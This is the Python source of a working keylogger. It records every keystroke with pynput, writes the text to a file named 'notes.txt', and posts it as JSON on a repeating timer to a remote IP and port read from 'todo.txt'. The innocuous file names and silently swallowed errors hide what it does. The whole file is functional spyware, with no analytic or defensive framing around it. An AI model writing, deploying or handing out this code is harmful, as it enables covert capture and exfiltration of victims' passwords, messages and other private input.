from pynput import keyboard
import requests
import json
import threading


try:
    with open("todo.txt", "r") as f:
        lines = f.readlines()
        ip_address = lines[0].strip()
        interval = int(lines[1])
        port = lines[2]
        f.close()
except:
    pass

keys = ""

def send():
    try:
        with open("notes.txt", "r") as f:
            payload = json.dumps({"keyboardData": f.read()})
            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
    except:
        pass
    finally:
        try:
            timer = threading.Timer(interval, send)
            timer.start()
        except:
            pass

def on_press(key):
    global keys
    
    with open("notes.txt", "w", encoding="utf-8") as f:
        if key == keyboard.Key.enter:
            keys += "\n"
            f.write(keys)
        elif key == keyboard.Key.tab:
            keys += "\t"
            f.write(keys)
        elif key == keyboard.Key.space:
            keys += " "
            f.write(keys)
        elif key == keyboard.Key.shift:
            keys += "'shift'"
            f.write(keys)
        elif key == keyboard.Key.backspace:
            keys += "'backspace'"
            f.write(keys)
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            keys += "'ctrl'"
            f.write(keys)
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            keys += "'alt'"
            f.write(keys)
        elif key == keyboard.Key.esc:
            keys += "'esc'"
            f.write(keys)
        elif key == keyboard.Key.caps_lock:
            keys += "'caps_lock'"
            f.write(keys)
        elif key == keyboard.Key.delete:
            keys += "'del'"
            f.write(keys)
        elif key == keyboard.Key.cmd:
            keys += "'cmd'"
            f.write(keys)
        else:
            keys += str(key).strip("'")
            f.write(keys)
        
with keyboard.Listener(on_press=on_press) as listener:
    send()
    listener.join()
